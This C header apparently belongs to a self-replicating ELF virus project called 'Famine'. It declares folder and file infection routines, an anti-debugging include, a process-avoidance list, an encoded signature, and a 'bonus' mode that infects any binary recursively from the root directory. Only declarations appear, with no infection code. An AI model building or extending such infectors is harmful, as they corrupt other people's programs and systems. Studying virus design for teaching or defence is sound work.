#ifndef FAMINE_H
#define FAMINE_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <dirent.h>

typedef
enum targets
{
    ANY_BINARY,
    X32_BIT_BINARY,
    X64_BIT_BINARY,
    NON_BINARY,
}
e_targets;

#define PROCESS_AVOID           (const char *[]){"firefox-esr"}
#define PROCESS_COUNT           sizeof(PROCESS_AVOID) / sizeof(char*)

#define SIGNATURE_ELF           "\177ELF"
#define SIGNATURE_ELF_LENGTH    4
#define SIGNATURE_ELF32         SIGNATURE_ELF"\1"
#define SIGNATURE_ELF64         SIGNATURE_ELF"\2"

#define SIGNATURE               (const int[]){1349743717,1768255084,1663071845,1702062450,1864380782,773859376,1668244521,1696621156,2037542688,1936010601,1836410982,1918987885}
#define SIGNATURE_LENGTH        sizeof(SIGNATURE) / sizeof(int) * 4

#define SUCCESS                 0
#define FALSE                   0
#define FAILURE                 1
#define TRUE                    1

#define DEFAULT_PATH            (const char *[]){"/tmp/test", "/tmp/test2"}
#define DEFAULT_COUNT           sizeof(DEFAULT_PATH) / sizeof(char*)
#define DEFAULT_TARGETS         (e_targets) X64_BIT_BINARY
#define DEFAULT_RECURSIVE       FALSE

#define BONUS_PATH              (const char *[]){"/"}
#define BONUS_COUNT             sizeof(BONUS_PATH) / sizeof(char*)
#define BONUS_TARGETS           (e_targets) ANY_BINARY
#define BONUS_RECURSIVE         TRUE

void    setup_emergency(void);
int     infect_folder(const char *dirpath, e_targets type, int recursive);
void    infect_file(const char *filepath, e_targets target);
int     convert_from(int val);
void    transform(char* data, const int* table, size_t length);

#endif /* FAMINE_H */
